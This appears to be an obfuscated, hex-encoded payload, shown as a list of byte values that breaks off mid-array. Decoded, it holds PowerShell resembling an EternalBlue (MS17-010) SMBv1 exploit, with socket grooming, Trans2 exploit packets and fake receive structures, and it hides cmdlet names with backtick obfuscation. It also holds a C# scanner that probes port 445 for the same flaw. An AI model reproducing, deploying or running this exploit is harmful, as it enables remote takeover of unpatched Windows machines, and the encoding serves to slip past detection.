43,'6c', 69 ,65 ,'6e', 74,'d', 'a' ,20, 20 ,20 ,20,20 ,20,20, 20, 20 ,24,67, 72,'6f','6f','6d', '5f', 73 ,'6f', 63,'6b' , 73,20 ,'2b' , '3d',20, 24 , 67 , 73 , '6f' ,63,'6b', 'd' , 'a' , 20, 20, 20 , 20, 20,20, 20, 20,20, 24, 67 ,73, '6f',63 , '6b' , '2e' ,53,65, '6e',64 ,28,24, 70 ,61, 79 , '6c' , '6f',61, 64,'5f' , 68 , 64, 72,'5f', 70, '6b', 74,29, 20 ,'7c' , 20 ,'6f',75 , 60, 54, '2d' ,'6e', 75 ,60, '6c', '6c' , 'd' ,'a' , 20,20 , 20, 20 , 20 , '7d' , 'd' ,'a', 20 ,20 ,20 ,20,24, 68,'6f' , '6c' , 65,43, '6f','6e', '6e' ,'2e' , 63,'6c' , '6f' , 73 , 65 ,28,29,'d' ,'a' ,'d' ,'a', 20, 20 ,20,20 ,24 , 74 ,72, 61 ,'6e',73,32 , '5f' ,70,'6b' , 74 , 32, 20,'3d',20,'4d' , 61, '6b',60 , 65 , '5f', 53 , '4d' ,60 ,42, 31,'5f' ,60 , 54 , 52, 61 ,'6e' , 73 ,32,'5f', 45 , 78, 50 , '6c','6f', 60 , 49,54 , '5f' ,50,60,41,43 ,'4b' ,45, 54 ,38 ,20 ,24,73 , '6d', 62 ,68 ,65, 61 ,64,65 , 72 , 32, '2e', 74,72, 65, 65 , '5f' ,69 , 64 , 20 ,24 ,73 ,'6d',62 , 68,65,61 , 64, 65 , 72 , 32 , '2e' , 75 ,73,65,72, '5f', 69,64 ,20 ,24,66, 65 , 61,'4c' ,69, 73,74, '4e' ,78 ,'5b',24 , 70 , 72, '6f',67, 72 ,65,73, 73 ,32, '2e' , '2e', 24 , 66 , 65 , 61 , '4c',69,73 , 74 ,'4e',78, '2e',63,'6f' , 75 , '6e' , 74, '5d' ,20,24,74, 69 ,'6d', 65,'6f' ,75 , 74,32 ,'d','a', 20,20,20,20, 24,73 ,'6f',63,'6b' , 32 ,'2e' ,53 , 65,'6e', 64, 28, 24 , 74,72 ,61 ,'6e' ,73, 32 ,'5f',70, '6b',74,32 ,29 ,20,'7c', 20, '6f',75, 60 , 54,60, '2d' ,'6e', 75,'4c', '6c','d' , 'a' , 20, 20,20 ,20, 24 ,72,61 , 77 , 32,'2c' ,20,24, 74 ,72, 61 ,'6e', 73, 68,65, 61,64 , 65 ,72, 32, 20 , '3d' ,20, 53 , '6d' ,60 , 42,31,'5f',67, 45, 60 ,54 ,'5f', 52 , 45 ,73 ,60, 70 ,'4f' , 60, '4e' ,73 ,60,65, 38 , 28 ,24 ,73 ,'6f' ,63 ,'6b',32 ,29 ,'d' , 'a', 20, 20 ,20,20 ,69,66,20, 28,24 , 72, 61 , 77 ,32,20 ,'2d',65,71 ,20 , '2d' ,31, 20 ,'2d' ,61,'6e', 64 , 20 , 28, 24, 74, 72 ,61,'6e' ,73, 68 ,65 ,61 ,64, 65 , 72, 32 ,20,'2d',65 ,71,20 , '2d' ,31 , 29, 29 ,'7b', 72 ,65, 74, 75,72 ,'6e' , 20 ,24 , 66 , 61, '6c' , 73 , 65 ,'7d', 'd','a',20 ,20 , 20 ,20 , 66 ,'6f',72, 65, 61,63,68 ,20,28,24,73, '6b',20,69 , '6e' , 20 , 24 ,67 ,72, '6f','6f', '6d','5f',73,'6f' , 63 , '6b', 73 , 29 ,'d' ,'a' ,20,20 , 20, 20,'7b' ,'d' , 'a' , 20 , 20, 20 , 20, 20 ,20, 20, 20 , 24 , 73,'6b' , '2e' ,53 , 65 , '6e', 64 ,28 , '5b',62, 79, 74 ,65 , '5b' ,'5d', '5d' , 30,78 , 30 ,30, 29,20,'7c' ,20 ,'6f' , 55 , 60 , 54,'2d' ,60 ,'4e' ,75 , '4c','4c','d' ,'a', 20 ,20 ,20,20, '7d' ,'d', 'a' ,'d', 'a',20 , 20, 20,20 , 24 ,74, 72 ,61,'6e' , 73 , 32, '5f',70, '6b' ,74, 20, '3d' , '4d', 41 ,'6b' ,45 ,'5f' , 73 , '6d',42, 31 ,60, '5f' , 54 , 72 ,61 , 60 , '4e', 53 , 32,'5f' ,65 ,58, 60 , 70,'6c', '4f' ,60, 49,54 , '5f' ,60,70 ,41, 63 ,60,'4b' , 65 , 60 ,54,38 ,20, 24 ,73 ,'6d', 62 , 68 ,65,61 ,64 ,65 ,72 , '2e',74,72 , 65 ,65, '5f',69 , 64,20 , 24 ,73,'6d' , 62 ,68,65,61 , 64 , 65,72,'2e',75, 73 ,65 ,72, '5f' , 69 , 64, 20,24,66 , 65,61, '4c', 69,73, 74, '5b', 24 ,70,72, '6f', 67, 72 , 65 ,73 ,73, '2e', '2e' ,24 ,66,65,61 ,'4c' ,69 , 73 ,74, '2e' , 63 ,'6f' , 75 ,'6e' , 74,'5d', 20 , 24 ,74 , 69 , '6d', 65,'6f' , 75, 74,'d' , 'a',20 ,20,20,20, 24, 73, '6f',63, '6b' ,'2e',53 ,65 , '6e', 64,28,24, 74 ,72,61,'6e',73,32,'5f',70, '6b', 74,29, 20 ,'7c' , 20,'6f' ,75 , 54,60, '2d', '6e' , 75,60,'4c' , '6c' , 'd' , 'a' ,20,20,20 ,20,24,72 , 61,77 , '2c',20, 24,74, 72, 61, '6e', 73 ,68 ,65,61,64,65 ,72,20 ,'3d' ,20,73, '4d' ,60 ,42 ,60, 31 ,'5f',47,65, 74, '5f' , 52 , 65, 53 ,50, 60, '6f' , '6e',73 ,65 , 38 , 28,24 , 73 , '6f', 63 , '6b' , 29 , 'd' ,'a', 20 ,20 , 20,20,69 , 66, 20 ,28,24 ,72, 61 ,77,20 , '2d',65, 71, 20, '2d' ,31 ,20 , '2d' ,61,'6e',64 , 20,28 , 24,74,72, 61 , '6e',73 , 68 , 65 ,61 ,64 ,65 ,72 ,20 , '2d', 65, 71,20,'2d' , 31 , 29 ,29 , '7b' , 72, 65 ,74 ,75 , 72 , '6e', 20, 24 , 66,61,'6c' , 73 , 65,'7d','d' , 'a', 20 ,20 ,20, 20 ,66,'6f', 72,65 , 61 ,63, 68,20 , 28 ,24,73 ,'6b' ,20,69,'6e',20,24,67,72 , '6f','6f','6d' ,'5f', 73,'6f', 63, '6b',73, 29 ,'d', 'a' ,20 ,20, 20 , 20 ,'7b' , 'd' ,'a',20,20 , 20, 20,20 ,20 , 20, 20 , 24 , 73,'6b','2e' , 53 , 65,'6e', 64,28, 24,66 ,61,'6b',65 , '5f' , 72 ,65 ,63 , 76 ,'5f',73, 74, 72 , 75 ,63, 74, 20 , '2b',20,24, 73,63,29,20 , '7c' ,20, '6f',55, 60 , 54 ,'2d' ,60 ,'4e' ,75, '4c', '6c' ,'d' , 'a' , 20,20 , 20 ,20 ,'7d', 'd' , 'a' , 20 ,20 ,20,20, 20, 66, '6f',72,65, 61 ,63 , 68,20,28 , 24, 73, '6b' ,20 ,69, '6e',20 , 24 ,67, 72 ,'6f', '6f' ,'6d', '5f' , 73, '6f',63 , '6b' , 73,29,'d' , 'a',20 ,20 ,20 , 20 ,'7b' ,'d', 'a' , 20 ,20, 20, 20,20,20,20,20 , 24 ,73 , '6b','2e', 63, '6c' ,'6f' ,73 ,65, 28 ,29, 20 ,'7c' , 20 ,'6f',55,74 , '2d','6e' , 55 , 60, '6c', '4c', 'd', 'a', 20,20 , 20 , 20,'7d' ,'d' , 'a' ,20,20,20 ,20 ,24,73 ,'6f', 63 ,'6b', '2e',43 ,'6c' , '6f', 73, 65,28,29 , '7c',20 ,'6f',55 , 60, 54 ,'2d' ,'6e' ,55 ,'4c' , '4c','d','a',20 ,20, 20 , 20, 72, 65,74 ,75 , 72 , '6e' ,20 , 24,74, 72 ,75 ,65 ,'d' , 'a' ,20, 20 ,'7d' ,'d','a','d', 'a' ,'d' ,'a',24, 53 ,'6f' ,75, 72 ,63,65 , 20,'3d', 20,40 , 22 ,'d' , 'a' ,75,73 ,69 ,'6e', 67,20 , 53 ,79 ,73 , 74 , 65,'6d' ,'3b' , 'd' , 'a' ,75,73,69 ,'6e' ,67,20 ,53, 79, 73 , 74 , 65,'6d', '2e', 43,'6f', '6c' ,'6c',65, 63, 74 ,69,'6f' , '6e' , 73, '2e' ,47 , 65 , '6e' , 65 , 72 ,69, 63,'3b','d' ,'a', 75 , 73,69 ,'6e',67 , 20, 53 ,79 ,73,74 ,65,'6d', '2e', 44,69 ,61, 67 ,'6e' , '6f', 73 ,74 , 69 , 63, 73, '3b', 'd' ,'a',75 ,73 ,69,'6e' , 67, 20,53, 79, 73 , 74,65,'6d', '2e',49 ,'4f' ,'3b','d' ,'a', 75,73, 69,'6e', 67 , 20, 53 ,79, 73, 74,65, '6d' ,'2e','4e' ,65,74 , '3b','d' ,'a' ,75 , 73, 69 ,'6e' , 67, 20 , 53,79 , 73,74 , 65, '6d','2e', '4e' , 65, 74 , '2e', 53, '6f', 63 , '6b',65 ,74 , 73, '3b' ,'d','a' , 75,73,69 ,'6e' , 67, 20,53, 79 ,73 ,74, 65 ,'6d' , '2e' ,54,65, 78 ,74 ,'3b' ,'d' , 'a' , 'd' , 'a' , '6e',61 , '6d',65,73 ,70 , 61 ,63,65 ,20 ,50,69, '6e' ,67, 43 ,61, 73 ,74 ,'6c',65 ,'2e',53, 63, 61, '6e','6e' ,65,72 , 73, 'd' , 'a' , '7b' ,'d' , 'a', 9,70, 75,62, '6c', 69,63, 20,63 , '6c' ,61, 73 ,73 ,20 ,'6d' ,31,37 , 73 , 63, 'd' ,'a',9 ,'7b','d','a', 9,9 ,73, 74 , 61,74 ,69,63 , 20 ,70,75 , 62 ,'6c', 69, 63 , 20 ,62 ,'6f' ,'6f', '6c',20 , 53,63,61 , '6e' ,28,73,74 , 72, 69 ,'6e', 67 , 20, 63,'6f','6d' ,70 , 75,74, 65,72 ,29 ,'d','a',9, 9, '7b', 'd','a' , 9, 9 ,9,54 , 63 , 70, 43,'6c',69, 65, '6e',74 , 20, 63, '6c',69,65,'6e' ,74 , 20 ,'3d', 20,'6e',65, 77,20 , 54 , 63,70,43,'6c' , 69, 65 ,'6e' , 74,28 , 29 , '3b','d','a',9 ,9, 9, 63 , '6c',69, 65 ,'6e',74, '2e', 43 , '6f','6e','6e', 65,63,74 , 28 ,63, '6f' ,'6d' ,70 ,75 , 74, 65 , 72,'2c' , 20, 34,34,35 , 29 , '3b', 'd', 'a' ,9,9,9 ,74, 72, 79 , 'd','a', 9,9,9 , '7b' , 'd' ,'a' , 9 ,9 , 9,9, '4e' ,65,74, 77,'6f',72 , '6b' , 53, 74, 72, 65, 61, '6d',20, 73 ,74 ,72, 65, 61 ,'6d', 20 ,'3d' , 20 , 63 , '6c',69, 65,'6e',74,'2e', 47,65 , 74 ,53 , 74 ,72 , 65 , 61, '6d' , 28,29 , '3b','d', 'a', 9 , 9, 9 , 9, 62,79 , 74 ,65, '5b','5d',20,'6e',65, 67 , '6f', 74,69 ,61,74 , 65 , '6d',65,73, 73 , 61 , 67 , 65,20, '3d' ,20, 47 , 65,74 , '4e', 65 ,67, '6f', 74 , 69, 61 ,74 ,65,'4d',65,73 ,73 , 61 ,67 ,65 ,28, 29 ,'3b', 'd', 'a',9 , 9, 9 , 9 ,73 ,74, 72,65,61,'6d', '2e' , 57 , 72,69,74 , 65, 28 ,'6e' ,65 ,67,'6f',74,69 ,61,74, 65 , '6d', 65 ,73 ,73 ,61 ,67, 65 , '2c', 20,30,'2c' ,20 , '6e',65 , 67 ,'6f',74, 69, 61,74 ,65,'6d', 65 ,73 , 73 ,61,67 ,65 ,'2e' , '4c' ,65 , '6e',67, 74 , 68 , 29, '3b' , 'd' , 'a',9 , 9 , 9,9,73, 74, 72 ,65 , 61 , '6d', '2e' ,46, '6c',75 , 73, 68 ,28,29 , '3b' , 'd' , 'a' , 9,9 ,9,9 ,62 , 79 , 74 , 65 , '5b','5d', 20,72 ,65,73 , 70, '6f', '6e', 73,65,20,'3d' , 20, 52 , 65 , 61 ,64,53 , '6d', 62,52 ,65,73,70 , '6f','6e' ,73, 65 ,28 ,73 , 74 , 72 , 65, 61,'6d',29 , '3b' , 'd' ,'a' , 9 , 9 , 9,9 , 69 , 66,20 , 28,21 ,28 ,72 ,65 , 73, 70, '6f' ,'6e',73 , 65 , '5b' ,38 ,'5d', 20 , '3d', '3d',20,30, 78 ,37 ,32 ,20 , 26, 26, 20, 72 , 65,73 , 70, '6f' , '6e' ,73 , 65 , '5b' ,39,'5d' , 20 , '3d','3d' , 20 , 30 ,30 , 29,29, 'd','a',9, 9, 9 ,9 , '7b' , 'd', 'a', 9,9, 9 ,9, 9 , 74 , 68 , 72 , '6f',77 , 20,'6e', 65 ,77,20,49, '6e', 76 , 61, '6c', 69 ,64, '4f' , 70 ,65 , 72 ,61, 74 , 69 , '6f','6e',45,78, 63 ,65 ,70,74 , 69,'6f','6e' ,28 , 22,69 ,'6e' , 76, 61 , '6c' , 69,64,20,'6e' , 65, 67 , '6f' , 74 ,69 , 61 , 74,65 ,20, 72 ,65, 73 , 70,'6f' ,'6e' ,73, 65 , 22,29 ,'3b','d','a' , 9, 9, 9,9 , '7d', 'd' , 'a' ,9, 9 , 9 ,9, 62,79 ,74 , 65 ,'5b' , '5d' ,20 , 73, 65, 73,73 , 69 ,'6f','6e' , 53, 65 , 74, 75 ,70,20 ,'3d', 20,47, 65 , 74, 53 ,65 ,73, 73, 69 , '6f' ,'6e' , 53, 65,74 , 75 ,70 , 41 ,'6e', 64,58 ,52 , 65 , 71 , 75, 65 , 73 ,74 , 28 ,72,65, 73, 70 ,'6f' ,'6e',73, 65,29, '3b' , 'd' , 'a' ,9 ,9 , 9 , 9, 73, 74 ,72, 65 , 61 ,'6d','2e' , 57 ,72,69, 74 ,65 ,28 ,73 , 65 , 73,73 ,69 ,'6f', '6e' ,53 , 65 ,74 ,75 ,70 ,'2c', 20 , 30 ,'2c' , 20 ,73, 65 , 73, 73, 69,'6f' , '6e' ,53,65 , 74, 75,70,'2e', '4c', 65,'6e' , 67,74,68,29,'3b','d' ,'a' ,9 ,9 , 9, 9, 73,74 , 72,65 ,61 ,'6d','2e' , 46,'6c' , 75 ,73 ,68, 28,29 , '3b','d', 'a',9,9,9, 9, 72,65, 73 , 70 , '6f', '6e', 73 ,65 , 20 , '3d',20,52 ,65 ,61 , 64 , 53,'6d',62, 52, 65 , 73 ,70 ,'6f', '6e', 73 ,65, 28 ,73 ,74 , 72 , 65 ,61 , '6d',29 , '3b','d' ,'a', 9, 9 , 9 ,9 , 69 , 66 ,20, 28 ,21,28, 72 , 65,73, 70 , '6f','6e',73 , 65 , '5b' , 38, '5d' ,20, '3d' , '3d' ,20 , 30, 78, 37 ,33 , 20, 26 ,26 , 20 , 72 ,65 , 73 , 70 ,'6f' ,'6e',73 , 65 ,'5b', 39, '5d' , 20 ,'3d','3d', 20, 30, 30,29 ,29,'d' ,'a' , 9 , 9,9 , 9 ,'7b' , 'd' ,'a',9, 9,9 , 9 ,9, 74, 68 ,72,'6f' ,77,20 , '6e',65 , 77, 20, 49 , '6e' ,76,61, '6c' ,69 ,64 ,'4f' , 70,65 ,72,61, 74, 69 ,'6f', '6e' , 45 , 78,63, 65, 70 ,74, 69, '6f', '6e', 28,22 , 69 , '6e' ,76 ,61, '6c' , 69 ,64 , 20,73 ,65 ,73 ,73 , 69, '6f' , '6e' , 53,65 ,74 , 75,70 , 20 ,72, 65, 73 ,70,'6f', '6e',73, 65,22 , 29 , '3b','d' ,'a',9,9,9, 9, '7d','d', 'a' , 9,9 , 9 ,9 , 62, 79 , 74, 65,'5b' , '5d' , 20, 74 , 72,65 , 65 ,63 ,'6f' , '6e' ,'6e', 65 ,63,74, 20 ,'3d', 20 , 47 ,65, 74, 54,72 ,65, 65 , 43,'6f','6e', '6e' ,65, 63 , 74, 41, '6e', 64 , 58 ,52 ,65,71, 75, 65 , 73 , 74, 28 , 72 , 65,73 , 70, '6f','6e' , 73 ,65,'2c',20,63, '6f','6d', 70, 75, 74, 65,72 ,29,'3b' , 'd' ,'a' ,9, 9 , 9, 9, 73,74,72, 65 ,61,'6d' , '2e' , 57 ,72, 69, 74,65,28,74,72 , 65,65 ,63,'6f' , '6e','6e', 65,63 ,74, '2c' , 20, 30 ,'2c' ,20,74 , 72 , 65, 65 , 63 ,'6f' ,'6e', '6e' , 65,63,74, '2e' ,'4c',65 ,'6e' ,67 ,74 ,68 ,29,'3b','d', 'a' , 9 , 9 ,9 ,9, 73 ,74 , 72 , 65 , 61,'6d' , '2e',46, '6c',75,73 , 68,28 ,29,'3b','d' ,'a',9 , 9,9 ,9 ,72 , 65 ,73 ,70 , '6f', '6e',73,65 ,20,'3d' ,20 , 52 ,65,61 , 64, 53,'6d',62 ,52, 65 , 73,70,'6f', '6e',73 ,65,28, 73,74 ,72 ,65 , 61,'6d' ,29, '3b', 'd' , 'a' ,9, 9, 9, 9 ,69 , 66 ,20,28 ,21 , 28 ,72 , 65, 73, 70 , '6f','6e', 73 ,65, '5b' , 38, '5d',20,'3d' ,'3d', 20, 30 , 78 ,37, 35,20, 26 , 26 , 20 ,72, 65,73,70, '6f','6e' , 73 , 65,'5b' ,39,'5d' ,20 , '3d' ,'3d' ,20,30, 30 ,29 ,29,'d' , 'a', 9, 9,9 , 9, '7b', 'd', 'a',9 ,9,9,9,9,74 , 68,72 , '6f' , 77 ,20,'6e' ,65, 77 , 20,49 ,'6e' ,76 , 61,'6c', 69 ,64,'4f', 70, 65,72,61 ,74,69, '6f' , '6e', 45 ,78 ,63, 65, 70, 74 ,69 , '6f' ,'6e' ,28 ,22 ,69, '6e',76, 61,'6c', 69, 64, 20 ,54 ,72 ,65 , 65, 43, '6f' ,'6e','6e' ,65,63, 74 ,20 , 72, 65, 73 , 70, '6f' ,'6e', 73 ,65 , 22, 29,'3b' , 'd','a',9 ,9,9 , 9 ,'7d' ,'d','a' ,9 ,9,9, 9,62,79, 74 , 65, '5b', '5d' , 20 ,70 , 65,65, '6b' ,'6e',61 ,'6d',65 ,64,70 , 69,70 , 65, 20,'3d', 20 , 47,65 ,74,50 ,65 ,65 ,'6b' ,'4e', 61 , '6d', 65, 64, 50 , 69 ,70,65,28,72 ,65 ,73 ,70 , '6f' , '6e', 73 , 65,29, '3b' , 'd' ,'a',9, 9, 9 , 9,73 , 74 ,72 , 65 ,61, '6d' , '2e' , 57, 72, 69, 74 ,65 , 28, 70 ,65,65,'6b' ,'6e' , 61, '6d' ,65 ,64 , 70, 69 ,70, 65,'2c',20 , 30 ,'2c' , 20 , 70,65, 65 ,'6b', '6e' ,61, '6d',65,64 ,70, 69,70 , 65 ,'2e' ,'4c', 65,'6e',67,74 ,68,29 ,'3b','d','a', 9, 9 ,9 ,9,73, 74,72,65,61 , '6d' ,'2e' ,46 ,'6c' ,75 ,73 ,68 , 28 , 29 , '3b' ,'d' , 'a' ,9, 9, 9 , 9, 72 , 65 ,73, 70 , '6f' , '6e',73 ,65 , 20 , '3d', 20 , 52, 65 ,61 , 64 , 53 , '6d' ,62, 52,65,73,70, '6f', '6e',73, 65 , 28, 73, 74, 72 , 65,61,'6d' , 29, '3b','d' , 'a', 9 ,9 ,9,9 , 69 ,66 , 20 , 28, 72, 65 , 73,70, '6f', '6e' , 73 ,65, '5b',38 , '5d', 20 ,'3d', '3d', 20,30 ,78, 32, 35 ,20, 26,26 ,20 , 72,65,73, 70, '6f' ,'6e' ,73,65, '5b',39,'5d',20 ,'3d', '3d', 20,30 ,78, 30 , 35 , 20,26,26 ,20 , 72,65, 73 ,70 , '6f' , '6e' , 73 ,65, '5b' , 31 ,30, '5d' ,20,'3d', '3d',30 ,78 ,30 ,32 , 20 ,26 , 26, 20,72 ,65, 73 ,70 ,'6f','6e' ,73,65,'5b',31,31, '5d' ,20 ,'3d', '3d', 30,78,30,30 ,20, 26, 26 ,20 , 72,65 , 73, 70 , '6f', '6e' , 73 , 65 , '5b' ,31, 32 ,'5d', 20 , '3d' ,'3d',30 , 78 , 63 , 30 ,20, 29 , 'd' , 'a' , 9 ,9, 9,9 ,'7b' ,'d' , 'a',9 , 9 , 9 , 9,9,72, 65 ,74, 75 , 72 , '6e', 20,74 ,72 ,75 ,65 ,'3b','d', 'a',9 ,9, 9 , 9, '7d', 'd', 'a', 9, 9 ,9, '7d', 'd' , 'a' , 9 ,9, 9,63, 61, 74,63 ,68, 20 , 28 , 45, 78 ,63 ,65,70 ,74,69 , '6f', '6e', 29,'d' ,'a' ,9,9,9 ,'7b' , 'd','a',9 ,9 ,9,9, 74,68, 72,'6f' ,77 , '3b','d','a' , 9 , 9,9 , '7d', 'd' ,'a' , 9, 9 , 9 ,72,65,74 , 75 ,72,'6e' ,20,66 , 61, '6c' ,73 , 65, '3b', 'd','a' ,9 ,9 , '7d' ,'d', 'a' , 'd' , 'a', 9, 9,70 , 72 , 69 ,76, 61 , 74, 65 ,20,73, 74 , 61 ,74 ,69 ,63 ,20 , 62 ,79 ,74,65 , '5b' , '5d', 20, 52 , 65 , 61,64 , 53 , '6d' , 62 ,52, 65, 73 , 70,'6f','6e' , 73 ,65 ,28, '4e' , 65,74 ,77 , '6f', 72 ,'6b', 53 , 74,72, 65 , 61 , '6d' ,20,73 ,74, 72 , 65,61 , '6d' , 29,'d' , 'a' , 9 ,9,'7b','d' ,'a', 9 ,9 , 9, 62,79 , 74 , 65 , '5b' , '5d',20, 74, 65 , '6d' ,70,20 ,'3d',20 ,'6e' , 65 ,77, 20,62 ,79 , 74, 65 , '5b',34,'5d' ,'3b', 'd', 'a',9 ,9 , 9,73 ,74,72 ,65 , 61 ,'6d' ,'2e',52 ,65 ,61 ,64, 28, 74 ,65,'6d' , 70,'2c' , 20,30 ,'2c' , 20 , 34 ,29 , '3b','d','a', 9 ,9 , 9, 69 , '6e',74, 20,73,69 ,'7a' , 65 , 20,'3d',20,74 , 65 ,'6d' , 70 ,'5b', 33 ,'5d' ,20, '2b', 20, 74 ,65 , '6d' ,70,'5b' , 32 ,'5d', 20 , '2a' ,20,30 , 78 ,31 ,30 ,30 , 20 ,'2b', 20 ,74,65, '6d', 70 , '5b' ,33, '5d' , 20 , '2a', 20 , 30, 78, 31, 30,30 ,30,30 ,'3b' ,'d' ,'a',9,9 ,9 ,62, 79,74 ,65 ,'5b', '5d', 20, '6f' ,75,74 ,70,75,74 ,20 ,'3d', 20, '6e' , 65 ,77 ,20 ,62, 79, 74 ,65,'5b', 73,69, '7a' , 65 , 20 , '2b', 20 ,34 ,'5d','3b', 'd','a' , 9 ,9, 9 ,73, 74, 72 ,65 ,61 , '6d' ,'2e',52,65 , 61, 64, 28 ,'6f', 75, 74,70, 75,74 ,'2c' , 20,34,'2c' , 20, 73 , 69 ,'7a' ,65 , 29, '3b' ,'d','a' , 9 ,9 ,9 ,41,72 , 72, 61 ,79, '2e', 43,'6f' , 70 ,79,28 ,74, 65, '6d',70, '2c', 20,'6f',75 , 74 ,70,75 ,74 , '2c' , 20,34 , 29 , '3b','d' , 'a' , 9,9 ,9, 72, 65, 74 , 75 , 72,'6e' ,20 , '6f',75, 74, 70,75 , 74 , '3b' ,'d' , 'a', 9, 9 ,'7d', 'd', 'a','d' ,'a' , 9,9,73,74, 61, 74 , 69 ,63,20,62 , 79, 74,65, '5b','5d', 20 , 47,65 ,74, '4e',65 ,67,'6f', 74,69,61 , 74 , 65, '4d' ,65 ,73 , 73 , 61, 67 ,65 , 28 ,29 , 'd', 'a' ,9,9, '7b','d' ,'a' , 9,9, 9,62, 79, 74 , 65 ,'5b', '5d' ,20 ,'6f', 75 ,74 ,70 , 75 ,74,20 , '3d' , 20,'6e' , 65, 77 , 20 , 62,79 ,74, 65, '5b' ,'5d' ,20 ,'7b', 'd' ,'a',9, 9 ,9 , 9,30,78 ,30,30,'2c' ,30 ,78 ,30 , 30 , '2c',30 ,78 , 30,30,'2c',30, 78 ,30,30,'2c', 'd' , 'a' ,9 ,9 , 9 ,9 ,30, 78 , 66,66, '2c' , 30 , 78,35,33,'2c', 30 , 78 ,34 ,64, '2c',30 , 78,34, 32, '2c','d' ,'a' , 9 , 9 , 9, 9 , 30,78 , 37,32,'2c' , 'd' ,'a' ,9 , 9 ,9,9 ,30 , 78, 30 , 30 , '2c', 'd','a',9,9 ,9, 9, 30 , 78 , 30 ,30 , '2c', 'd' ,'a', 9 ,9 ,9,9 ,30,78 , 30,30 , '2c', 30 ,78, 30 ,30 , '2c', 'd' ,'a', 9, 9 ,9, 9 , 30, 78, 31 ,38, '2c', 'd','a' ,9 , 9, 9, 9,30, 78 , 30, 31, '2c',30,78, 32 , 38 ,'2c' ,'d','a',9 ,9,9 , 9 ,30, 78 , 30, 30,'2c', 30 , 78 , 30,30 , '2c','d', 'a',9 ,9,9, 9,30,78 , 30, 30,'2c' , 30 ,78, 30, 30 ,'2c' , 30, 78 , 30, 30,'2c' ,30 ,78,30, 30, '2c' ,30 ,78 , 30 , 30,'2c', 30 , 78 ,30,30 , '2c' , 30 , 78, 30, 30 ,'2c' , 30,78 ,30 , 30 ,'2c','d', 'a' ,9 ,9 ,9, 9,30,78 , 30 ,30,'2c' , 30 ,78 ,30 , 30 , '2c', 'd', 'a' , 9 , 9 , 9,9, 30 ,78, 30 ,30,'2c',30, 78 , 30 ,30 ,'2c' , 'd','a' , 9 ,9, 9,9 ,30 , 78,34 ,34,'2c',30,78,36 , 64, '2c' ,'d', 'a', 9, 9 ,9 ,9 , 30 , 78, 30, 30 ,'2c', 30 ,78 ,30, 30, '2c' , 'd' ,'a' ,9,9,9 ,9,30,78 ,34 ,32 , '2c' , 30,78 ,63, 31 , '2c' , 'd', 'a', 9, 9 ,9,9 ,30,78,30,30 ,'2c','d', 'a', 9 ,9 ,9 ,9 ,30 , 78, 33 ,31 , '2c' , 30 ,78 , 30, 30, '2c', 'd' ,'a',9, 9 , 9 , 9 , 30 ,78, 30,32, '2c' ,30, 78 ,34 ,63,'2c', 30 ,78 ,34 , 31 ,'2c', 30 , 78 , 34, 65 ,'2c' ,30 , 78 ,34 , 64,'2c' ,30, 78, 34 , 31,'2c' , 30,78,34, 65, '2c' ,30,78, 33,31 , '2c' , 30, 78, 32 , 65 , '2c' , 30, 78 , 33, 30, '2c' , 30, 78,30, 30 ,'2c' ,'d', 'a',9 ,9 , 9 ,9,30 , 78, 30 , 32, '2c',30,78,34 , 63,'2c' ,30,78,34 , 64 , '2c',30 ,78 , 33,31,'2c', 30 ,78,32 , 65 , '2c' ,30 ,78, 33,32,'2c' , 30,78 ,35,38 , '2c', 30 , 78, 33, 30,'2c',30 , 78,33 ,30,'2c' ,30 ,78 , 33,32, '2c' , 30 ,78 , 30 , 30, '2c' , 'd' ,'a' , 9, 9 ,9, 9 ,30 , 78, 30,32,'2c',30 , 78,34 ,65 , '2c' ,30 ,78 ,35, 34 ,'2c' , 30,78 , 32 , 30,'2c' , 30, 78, 34, 63 ,'2c' , 30 ,78,34, 31 ,'2c' ,30 , 78 ,34,65 ,'2c' , 30 ,78 ,34, 64 , '2c',30 , 78 , 34 , 31,'2c', 30,78, 34, 65,'2c',30 , 78,32, 30 , '2c', 30 ,78 ,33 , 31, '2c', 30 ,78,32 ,65, '2c' ,30 ,78,33 , 30 , '2c', 30,78, 30, 30, '2c' , 'd' , 'a' ,9 , 9 ,9 ,9 , 30 , 78,30,32 ,'2c' ,30,78,34,65, '2c', 30, 78 , 35 ,34 , '2c',30 , 78 , 32 ,30, '2c', 30 ,78 , 34, 63,'2c' ,30,78, 34 ,64,'2c' , 30 , 78 , 32 ,30,'2c' ,30,78,33, 30,'2c' , 30,78,32,65,'2c' ,30 ,78 , 33 , 31,'2c',30 , 78, 33, 32 ,'2c', 30, 78,30 ,30, '2c','d' ,'a',9,9,9, '7d' , '3b','d' ,'a' , 9,9, 9 , 72 ,65,74 , 75 , 72 ,'6e' , 20 ,45,'6e' , 63 , '6f' , 64 ,65 ,'4e',65, 74 , 42,69, '6f' ,73 ,'4c' ,65,'6e', 67,74, 68, 28 , '6f' ,75 , 74,70 ,75 ,74 , 29 , '3b', 'd', 'a' , 9 ,9 , '7d' ,'d', 'a','d', 'a' ,9 ,9,73,74 ,61 ,74 ,69,63,20,62 ,79 ,74, 65 ,'5b' ,'5d' ,20 , 47 ,65, 74 ,53, 65 ,73 ,73, 69,'6f' , '6e' , 53 ,65, 74,75 , 70 , 41 ,'6e', 64 ,58 ,52 , 65 , 71,75 , 65,73 ,74, 28 ,62, 79 ,74, 65 , '5b', '5d',20 , 64 , 61, 74 , 61, 29 ,'d', 'a' , 9 , 9, '7b','d', 'a',9, 9, 9 , 62 ,79, 74,65,'5b' ,'5d' ,20,'6f' , 75,74 ,70, 75,74,20 ,'3d' ,20,'6e' ,65 ,77 ,20 , 62 ,79,74 ,65 ,'5b' ,'5d',20, '7b','d','a', 9, 9 ,9 ,9 , 30 , 78, 30,30 ,'2c' , 30,78, 30 ,30,'2c' ,30 ,78,30,30 , '2c' , 30 ,78, 30 ,30 ,'2c','d', 'a',9 , 9,9,9, 30, 78 , 66, 66 ,'2c' ,30,78 , 35,33 , '2c' ,30, 78 , 34,64 , '2c',30 ,78 , 34 , 32 , '2c', 'd', 'a',9 , 9,9, 9 ,30, 78 ,37, 33,'2c' ,'d', 'a' ,9 ,9 ,9,9 ,30,78,30, 30 , '2c', 'd' ,'a', 9 , 9 , 9 , 9 , 30 ,78 , 30 ,30 , '2c','d' , 'a' ,9 ,9,9 ,9,30 ,78 ,30 , 30 ,'2c' , 30 ,78 ,30,30,'2c' , 'd' ,'a' ,9 ,9, 9, 9, 30, 78 , 31 , 38 , '2c','d' , 'a' ,9 , 9 ,9,9, 30, 78 ,30 ,31 , '2c', 30 ,78 ,32 , 38, '2c' , 'd', 'a' ,9,9 , 9 , 9,30 ,78, 